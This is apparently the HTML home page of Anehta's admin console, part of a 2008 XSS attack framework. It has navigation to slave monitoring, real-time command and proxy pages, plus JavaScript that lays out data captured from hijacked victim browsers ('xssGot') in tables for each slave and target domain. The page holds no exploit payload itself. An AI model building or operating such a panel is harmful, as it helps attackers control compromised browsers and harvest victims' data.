<html><meta http-equiv=content-type content="text/html; charset=utf-8">
	<head>
		<title>
			Anehta!
		</title>
	  <script src="../library/anehta.js" ></script>
	  <script src="../library/jQuery.js" ></script>
	  <script src="../server/js/effects.core.js"></script>
	  <script src="../server/js/ui.core.js"></script>
	  <script src="../server/js/effects.bounce.js"></script>
	  <script src="../server/js/effects.slide.js"></script>
	  <script src="../server/js/effects.shake.js"></script>
	  <!-- script src="../server/js/effects.explode.js"></script -->
	  <script src="../server/js/effects.clip.js"></script>
	  <script src="../server/js/ui.accordion.js"></script>
	  <script src="../server/js/ui.draggable.js"></script>
	  
	  <script src="../server/js/loadData.js"></script>
	  <link rel="stylesheet" type="text/css" href="css/style.css" />
	  	  
</head>
<body onload="return initData();">

<img id="logo" style="float:top;z-index: 19999" src="../server/img/logo.jpg" />	
<ul id="basictab" class="basictab">	
<li class="selected" style="margin: 0 0 0 188px;"><a href="../server/admin.php">Home</a></li>
<li><a href="../server/slavemonitor.php">Slave Monitor</a></li>
<li><a href="../server/rtcmd.php">RealTime CMD</a></li>
<li><a href="../server/clientproxy.php">Client Proxy</a></li>
<li><a href="../server/onlineproxy.php">Online Proxy</a></li>
<li><a href="../server/config.php">Configure</a></li>
<li><a href="../server/help.php">Help</a></li>
</ul>

<div id="xssSites" class="wireframemenu" style="float:left;" >
<ul>
<!--
<li onMouseover="dropdownmenu(this, event, menu2, '150px')" onMouseout="delayhidemenu()" ><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
<li><a href="">Anehta</a></li>
-->
</ul>
<a href="../server/rss.xml"><img style="float:top;" border="0" src="../server/img/rss.png" ></img>订阅Slave RSS</a>
</div>


<script>

// 每个页面的 dosomething可能不同
function dosomething(o){
	
	var slaveid = o.innerHTML;
	var whichDomain = obj_call_dropdownmenu.innerHTML;
	
	// 删除原来存在页面中间的注意事项
	var home_notes = $d.getElementById("home_notes");
	home_notes.parentNode.removeChild(home_notes);
	
	// 插入新的slave信息
	var blackboard = $d.getElementById("blackboard"); // 中间的大div
	
	home_notes = $d.createElement("div");
	home_notes.id = "home_notes";
	home_notes.style.width = "660px";
	home_notes.style.height = "320px";
	home_notes.style.margin = "15px 15px 15px 15px";
	home_notes.style.overflow = "auto";
	blackboard.appendChild(home_notes);
	
	
	for (i=(slaveData.record.length - 1); i>=0; i--){
	  if (slaveData.record[i].slaveWatermark == slaveid){ // slaveid 相同
	    if (slaveData.record[i].xssGot.requestURI.indexOf("://"+whichDomain) > -1){ // 目标域下的xssgot  	
	      //下面开始创建table
	      var slavetable = $d.createElement("table");
	      slavetable.id = "slavetable";
	      slavetable.name = slaveData.record[i].key;
	      slavetable.summary = "Anehta Slave Info Collected";
	      home_notes.appendChild(slavetable);
	      
	      // 表格之间换行间隔
	      var table_space = $d.createElement("div");
	      table_space.innerHTML = "<br /><br />";
	      home_notes.appendChild(table_space);
        
	      // 创建table head
	      var thead = $d.createElement("thead");
	      slavetable.appendChild(thead);
	      
	      var thead_tr = $d.createElement("tr");
	      thead.appendChild(thead_tr);
	      
	      // 创建列名
	      var thead_tr_th = new Array(); 
	      
	      thead_tr_th[0] = $d.createElement("th");
	      thead_tr_th[0].scope = "col";	  
	      thead_tr_th[0].innerHTML = "<b>XSS Info</b>";	
	      thead_tr.appendChild(thead_tr_th[0]);
        
	      thead_tr_th[1] = $d.createElement("th");
	      thead_tr_th[1].scope = "col";	  
	      thead_tr_th[1].innerHTML = "<b>Content</b>";	
	      thead_tr.appendChild(thead_tr_th[1]);
        
        
	      // 创建 tfoot
	      var tfoot = $d.createElement("tfoot");
	      slavetable.appendChild(tfoot);
        
	      var tfoot_tr = $d.createElement("tr");
	      tfoot.appendChild(tfoot_tr);
	      
	      var tfoot_tr_td = new Array();
	      tfoot_tr_td[0] = $d.createElement("td");
	      tfoot_tr_td[0].colspan = "4";
	      tfoot_tr_td[0].innerHTML = "FVCK!";
	      tfoot_tr.appendChild(tfoot_tr_td[0]);
        
	      tfoot_tr_td[1] = $d.createElement("td");
	      tfoot_tr_td[1].innerHTML = "&nbsp;";
	      tfoot_tr.appendChild(tfoot_tr_td[1]);
        
        
	      // 创建 table body
	      var tbody = $d.createElement("tbody");
	      slavetable.appendChild(tbody);
	      
	      //var tbody_tr = new Array();
	      var tbody_tr_td = new Array();
	      
	      // 创建row
	      $.each(slaveData.record[i], function(data){
	      	  // data; slaveData.record[i][data]
	      	  
	      	  var tbody_tr = $d.createElement("tr");
	          tbody.appendChild(tbody_tr);
	      	  
	      	  // 填充值     
	      	  if (data != "xssGot"){
	            tbody_tr_td[0] = $d.createElement("td");
	            tbody_tr_td[0].innerHTML = anehta.misc.htmlEncode(data);	  
	            tbody_tr.appendChild(tbody_tr_td[0]);
	            
	            tbody_tr_td[1] = $d.createElement("td");
	            tbody_tr_td[1].innerHTML = anehta.misc.htmlEncode(slaveData.record[i][data]);
	            tbody_tr.appendChild(tbody_tr_td[1]);	  
	          } 
	          else { // 处理 xssGot
	          	$.each(slaveData.record[i].xssGot, function(xssGotdata){
	          		  // 新的一行
	          		  var tbody_tr = $d.createElement("tr");
	                tbody.appendChild(tbody_tr);
	                
	          		  if (xssGotdata != "ajaxPostResponse" && xssGotdata != "ajaxGetResponse"){
	          	      tbody_tr_td[0] = $d.createElement("td");
	                  tbody_tr_td[0].innerHTML = anehta.misc.htmlEncode(xssGotdata);	  
	                  tbody_tr.appendChild(tbody_tr_td[0]);
	                
	                  tbody_tr_td[1] = $d.createElement("td");
	                  tbody_tr_td[1].innerHTML = anehta.misc.htmlEncode(slaveData.record[i].xssGot[xssGotdata]);
	                  tbody_tr.appendChild(tbody_tr_td[1]);	    
	                }      			          		
	          		});
	          }   		      	
	      	});
	    }
	  }
  }  
}

</script>


<!-- 以下是功能部分 -->

<div id="shiftcontainer" class="shiftcontainer" style="margin: 0 0 0 15px; float: left;">
  <div class="shadowcontainer" style="width: 700px;">
    <div id="blackboard" class="innerdiv" style="height:350px;">
    	<div id="home_notes">
      <ul>
      	<li> 注意事项：</li>
      	<li><a href="#">test</a></li>
      </ul>	
      <div>
    </div>
  </div>
</div>
		
		
</div>
</div>
<div align="center">	
	 <!--footer-->
  <div class="clear">
    <div class="line2">
    </div>
    <div class="clear">
      <label for="foot" style="color: #666666; font-size: 14px;">&copy;2008 <a href="http://anehta.googlecode.com">Anehta</a></label>
    </div>
  </div>
</div>	

</body>

</html>